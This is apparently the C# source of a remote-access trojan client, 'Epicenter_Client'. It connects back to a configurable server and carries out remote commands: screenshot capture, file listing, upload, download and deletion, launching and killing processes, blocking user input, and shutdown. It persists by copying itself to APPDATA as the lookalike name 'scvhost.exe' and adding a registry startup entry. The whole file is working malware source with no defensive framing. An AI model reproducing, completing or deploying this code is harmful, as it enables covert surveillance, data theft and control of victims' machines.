using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Management;
using System.Diagnostics;
using System.IO;

namespace Epicenter_Client
{
    static class Program
    {
        #region Win32 Imports
        // Importing for power options
        [DllImport("user32.dll")]
        public static extern int ExitWindowsEx(int operationFlag, int operationReason);

        // For lockdown
        [DllImport("user32.dll")]
        static extern bool BlockInput(bool fBlockIt);
        #endregion

        // Random set of bytes in order to check the validity of the incoming package
        // This set can be of any size
        static byte[] scheme = { 21, 36, 47, 71, 99, 61, 71, 71, 99, 255, 254, 253,
                            36, 45, 66, 253, 21, 46, 47, 66, 39, 41, 66, 99, 
                            253, 252, 251, 216, 222, 221, 216, 99, 41, 56, 57, 58, 3};

        // The set of bytes sent when valid data is received from the client
        // This byte array is consisting of arbitrary bytes and can be altered if needed - keep in mind that you should 
        //   also change it on the client side
        static byte[] recv_signal = { 20, 26, 91, 36, 71, 64, 63, 99, 251, 253, 69, 31, 31,
                                 72, 69, 109, 101, 108, 97, 110, 105, 101, 109, 101, 108};

        // Defining the global variables
        static string given_name = "Test Subject";
        public static string ipaddr = "127.0.0.1";
        static int port = 80;
        static uint authInterval = 60000;
        static uint connInterval = 60000;
        static string dumpImageName = "scvhost.exe";
        static char dumpLoc = 'A';



        static NetworkStream ns;
        static UTF8Encoding encoder = new UTF8Encoding();

        static void accessResource()
        {
            string wholeRes = encoder.GetString(Resources.file, 0, Resources.file.Length);

            if (!wholeRes.Contains("BEASDZXXXMEL") || !wholeRes.Contains("YEPTRUPTASKAMELANAZ"))
                Environment.Exit(0);

            wholeRes = wholeRes.Replace("BEASDZXXXMEL", String.Empty).Replace("YEPTRUPTASKAMELANAZ", String.Empty);

            if (!wholeRes.Contains("<retn>"))
                Environment.Exit(0);

            wholeRes = wholeRes.Substring(0, wholeRes.IndexOf("<retn>"));
            
            // Now we have the destIP<%SEP%>destPORT<%SEP%>given_name<%SEP%>connint<%SEP%>authint<%SEP%>imgname<%SEP%>dumploc stored in wholeRes

            string[] arguments = Regex.Split(wholeRes, "<%SEP%>");

            if (arguments.Length != 7)
                Environment.Exit(0);

            ipaddr = arguments[0];
            port = Convert.ToInt32(arguments[1]);
            given_name = arguments[2];
            connInterval = Convert.ToUInt32(arguments[3]) * 1000;
            authInterval = Convert.ToUInt32(arguments[4]) * 1000;
            dumpImageName = arguments[5];
            dumpLoc = arguments[6].ToCharArray()[0];

            // TODO: Disable this in the final release (MSGBox on GETRES)
            MessageBox.Show("IP: " + ipaddr + "\nport: " + port + "\ngiven_name: " + given_name + "\nconnInterval: " + connInterval.ToString() + 
                "\nAuthInterval: " + authInterval.ToString() + "\ndumpImageName: " + dumpImageName + "\nDumpLoc: " + dumpLoc);
        }

        [STAThread]
        static void Main(string[] args)
        {
            // TODO: Enable this in the final release  accessResource();

            // Checking if we are called to create a registry entry
            if (args.Length > 0)
            {
                System.Threading.Thread.Sleep(5000);
                if(args[0] == "-reg")
                    RegistryAlteration.AddToStartup();
            }

            // Defining the port and IP to form the connection.
            TcpClient client = null;
            IPAddress remoteIP = null;

            if (!IPAddress.TryParse(ipaddr, out remoteIP))
                if (!IPAddress.TryParse(NetTools.GetCorrespondingIP(ipaddr), out remoteIP))
                    Environment.Exit(0);

            IPEndPoint serverside = new IPEndPoint(remoteIP, port);

            bool isConnected = false;
            bool isAuthenticated = false;

            int bytesRead = 0;

            while (!isAuthenticated)
            {
                while (!isConnected)
                {
                    try
                    {
                        client = new TcpClient();
                        client.Connect(serverside);
                        isConnected = true;
                    }
                    catch { isConnected = false; System.Threading.Thread.Sleep((int)connInterval); }
                }

                ns = client.GetStream();
                byte[] message = new byte[2048];

                // Authentication package is now enclosed in the message byte array.
                prepareAuthPack().CopyTo(message, 0);
                
                // Sending the authentication package over to the server.
                ns.Write(message, 0, message.Length);

                // Waiting for the RECV_SIGNAL
                try
                {
                    bytesRead = ns.Read(message, 0, 2048);
                }
                catch
                {
                    System.Threading.Thread.Sleep(5000);
                }

                if (compareRECV(ref message) && isConnected)
                {
                    isAuthenticated = true;

                    // We are connected and authenticated. Now, it is time to wait for the commands.
                    while (isConnected && isAuthenticated)
                    {
                        try
                        {
                            bytesRead = ns.Read(message, 0, 2048);
                        }
                        catch 
                        {
                            DisconnectionRoutine(ref client, ref ns, ref isConnected, ref isAuthenticated);
                            System.Threading.Thread.Sleep(5000);
                        }

                        if (isConnected && isAuthenticated)
                        {
                            // Now, we are transferring the message to the latest processing step.
                            object[] toPass = new object[2];
                            toPass[0] = (object)bytesRead;
                            toPass[1] = (object)message;
                            Thread thProcess = new Thread( new ParameterizedThreadStart(ProcessMessage) );
                            thProcess.Start(toPass);
                        }
                    }
                }
                // Failed to authenticate
                else
                {
                    DisconnectionRoutine(ref client, ref ns, ref isConnected, ref isAuthenticated);
                    System.Threading.Thread.Sleep((int)authInterval);
                }
            }
        }

        static void DisconnectionRoutine(ref TcpClient client, ref NetworkStream ns, ref bool isConnected, ref bool isAuthenticated)
        {
            isAuthenticated = isConnected = false;
            ns.Close();
            client.Close();
        }

        static byte[] prepareAuthPack()
        {
            string authentication_package = given_name + "<%SEP%>" + Environment.OSVersion.ToString();

            byte[] toSend = new byte[authentication_package.Length + scheme.Length + 1];

            scheme.CopyTo(toSend, 0);
            toSend[scheme.Length] = 10;
            encoder.GetBytes(authentication_package).CopyTo(toSend, scheme.Length + 1);

            return toSend;
        }

        static bool compareRECV(ref byte[] message)
        {
            for (int i = 0; i < recv_signal.Length; i++)
            {
                if (message[i] != recv_signal[i])
                    return false;
            }
            return true;
        }

        static void ProcessMessage(object incoming)
        {
            object[] passedArray = (object[])incoming;

            int messageLen = (int)passedArray[0];
            byte[] message = (byte[])passedArray[1];

            // If it's just a RECV message, then simply ignore it.
            if ( compareRECV(ref message) )
                return;
            
            string strMessage = encoder.GetString(message, 0, messageLen);

            if (strMessage.Contains("messagebox<%SEP%>"))
            {
                string[] arguments = Regex.Split(strMessage, "<%SEP%>");
                MessageBox.Show(arguments[1], arguments[2]);
            }
            else if (strMessage == "REQ_SYSPROP")
                SendString( "SYSPROP<%SEP%>" + CompileSystemProfile() );
            else if (strMessage == "REQ_NETWPROP")
                SendString( "NETWPROP<%SEP%>" + CompileNetworkProfile() );
            else if (strMessage == "SHUTDOWN")
                PowerControl.ExitWindowsEx_MBO(1);
            else if (strMessage == "REBOOT")
                PowerControl.ExitWindowsEx_MBO(2);
            else if (strMessage == "LOGOFF")
                ExitWindowsEx(4, 0);
            else if (strMessage == "LOCKDOWN")
            {
                Thread lockdownThread = new Thread(new ThreadStart(Lockdown));
                inLockdown = true;
                lockdownThread.Start();
            }
            else if (strMessage == "UNLOCKDOWN")
            {
                inLockdown = false;
                System.Threading.Thread.Sleep(1000);
                BlockInput(false);
            }
            else if (strMessage == "SUICIDE")
                Environment.Exit(0);
            else if (strMessage == "LIST_PROCS")
                SendString( "PROCESS_LIST<%SEP%>" + GetProcesses() );
            else if (strMessage.Contains("KILLPROC<%SEP%>"))
            {
                string[] arguments = Regex.Split(strMessage, "<%SEP%>");

                if (arguments.Length != 2)
                    return;

                Process[] procs = Process.GetProcessesByName(arguments[1]);

                if (procs.Length > 0)
                    foreach (Process prc in procs)
                        prc.Kill();
            }
            else if (strMessage.Contains("LAUNCHPROC<%SEP%>"))
            {
                string[] arguments = Regex.Split(strMessage, "<%SEP%>");

                if (arguments.Length != 2)
                    return;

                try
                { Process.Start(arguments[1]); }
                catch { }
            }
            else if (strMessage.Contains("GETSCREEN<%SEP%>"))
            {
                string[] arguments = Regex.Split(strMessage, "<%SEP%>");

                int quality = 50;
                int port = 81;
                if (arguments.Length != 3)
                    return;

                if ( Int32.TryParse(arguments[1], out quality) && Int32.TryParse(arguments[2], out port) )
                {
                    bool isScreenTaken = ScreenshotMechanism.TakeScreenshot(quality);

                    if (!isScreenTaken)
                        return;

                    Thread thSStransfer = new Thread( new ParameterizedThreadStart(FileClient.SendByteArray) );
                    thSStransfer.Start((object)port);
                }
            }
            else if (strMessage.Contains("LIST_DIRECTORY<%SEP%>")) // We will now send amorphous packages instead
            {
                string[] arguments = Regex.Split(strMessage, "<%SEP%>");

                if (arguments.Length != 2)
                    return;

                FilelistMechanism.ListContents(arguments[1]);
                byte[] contextBuffer = encoder.GetBytes(FilelistMechanism.latestList);

                SendString( "EXPECT<%SEP%>filelist<%SEP%>" + contextBuffer.Length);

                // If there is nothing in it
                if (contextBuffer.Length == 0)
                    return;

                // Calm down! Let the server breathe for a while.
                System.Threading.Thread.Sleep(100);

                ns.Write(contextBuffer, 0, contextBuffer.Length);

                // No more length check either!
                /*if (FilelistMechanism.latestList.Length > 2032 - scheme.Length)
                    SendString("FILE_LIST<%SEP%>" + FilelistMechanism.latestList.Substring(0, 2031 - scheme.Length) );
                else
                    SendString("FILE_LIST<%SEP%>" + FilelistMechanism.latestList);*/
            }
            /*else if(strMessage.Contains("CONTINUE_LISTING<%SEP%>")) We won't be having this anymore
            {
                string[] arguments = Regex.Split(strMessage, "<%SEP%>");

                if (arguments.Length != 3)
                    return;

                if( Convert.ToInt32(arguments[2]) != 1)
                    SendString( "FILE_LIST<%SEP%>" + FilelistMechanism.latestList.Substring( Convert.ToInt32(arguments[1]), Convert.ToInt32(arguments[2]) - 1 ));
                else
                {
                    SendString( "FILE_LIST<%SEP%>" + FilelistMechanism.latestList[FilelistMechanism.latestList.Length - 1].ToString() );
                    arguments[2] = FilelistMechanism.latestList.Length.ToString();
                }
            }*/
            else if (strMessage.Contains("DELETE_FOLDER<%SEP%>"))
            {
                try
                {
                    Directory.Delete(Regex.Split(strMessage, "<%SEP%>")[1], true);
                    SendString("DISPLAY<%SEP%>Command executed successfully.");
                }
                catch (Exception e) { SendString("DISPLAY<%SEP%>An exception is caught while processing your request.\n\nContext:\n" + e.Message); }
            }
            else if (strMessage.Contains("DELETE_FILE<%SEP%>"))
            {
                try
                {
                    File.Delete(Regex.Split(strMessage, "<%SEP%>")[1]);
                    SendString("DISPLAY<%SEP%>Command executed successfully.");
                }
                catch (Exception e) { SendString("DISPLAY<%SEP%>An exception is caught while processing your request.\n\nContext:\n" + e.Message); }
            }
            else if (strMessage.Contains("SEND_FILE<%SEP%>"))
            {
                string[] arguments = Regex.Split(strMessage, "<%SEP%>");

                if (arguments.Length != 3)
                    return;

                Thread fileTransferThread = new Thread(new ParameterizedThreadStart(FileClient.SendFile));
                fileTransferThread.Start( (object)arguments );
            }
            else if (strMessage == "BIND_TO_START")
            {
                // TODO: Maybe we can read the process name and drop location from the resource too.
                string location = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + dumpImageName;
                File.Copy(Application.ExecutablePath, location);
                
                SendString("DISPLAY<%SEP%>The client will shut down temporarily and write itself to APPDATA and REGISTRY.");

                Process.Start(location, "-reg");
                Environment.Exit(0);
            }
            else if (strMessage == "STARTUP_STATUS")
            {
                if (RegistryAlteration.isPresent())
                    SendString("STARTUP_STATUS_RESULT<%SEP%>PRESENT");
                else
                    SendString("STARTUP_STATUS_RESULT<%SEP%>NONE");
            }
            else if(strMessage.Contains("GETREADY_RECV_FILE<%SEP%>"))
            {
                string[] arguments = Regex.Split(strMessage, "<%SEP%>");

                if (arguments.Length != 3)
                    return;

                Thread thRecvFile = new Thread(new ParameterizedThreadStart(FileClient.ReceiveFile));
                thRecvFile.Start((object)(new string[] { arguments[1], arguments[2] }));
            }
        }

        static bool inLockdown = false;
        static void Lockdown()
        {
            while (inLockdown)
            {
                BlockInput(true);
                System.Threading.Thread.Sleep(1000);
            }
        }

        static void SendString(string str)
        {
            // Forming the package: scheme + commtype_byte + string
            byte[] inBytes = encoder.GetBytes(str);
            byte[] toSend = new byte[inBytes.Length + scheme.Length + 1];

            if (inBytes.Length + scheme.Length + 1 > 2048)
                return;

            scheme.CopyTo(toSend, 0);
            toSend[scheme.Length] = 20;
            inBytes.CopyTo(toSend, scheme.Length + 1);

            ns.Write(toSend, 0, toSend.Length);
        }

        
        
        static string CompileSystemProfile()
        {
            string toReturn = String.Empty;

            toReturn += "User: " + System.Environment.UserName + "\n\n";
            toReturn += "Machine Name: " + System.Environment.MachineName + "\n\n";
            toReturn += "Operating System: " + System.Environment.OSVersion.ToString() + "\n\n";
            toReturn += "System Directory: " + System.Environment.SystemDirectory;

            return toReturn;
        }

        static string CompileNetworkProfile()
        {
            string toReturn = String.Empty;

            toReturn += "Hostname: " + System.Net.Dns.GetHostName() + "\n\n";
            toReturn += "IP: " + Dns.GetHostByName(Dns.GetHostName()).AddressList[0].ToString();

            return toReturn;
        }


        static string GetProcesses()
        {
            string toReturn = String.Empty;
            Process[] procs = Process.GetProcesses();

            foreach (Process proc in procs)
                toReturn += proc.ProcessName + "<%SEP%>";

            return toReturn;
        }




        
    }
}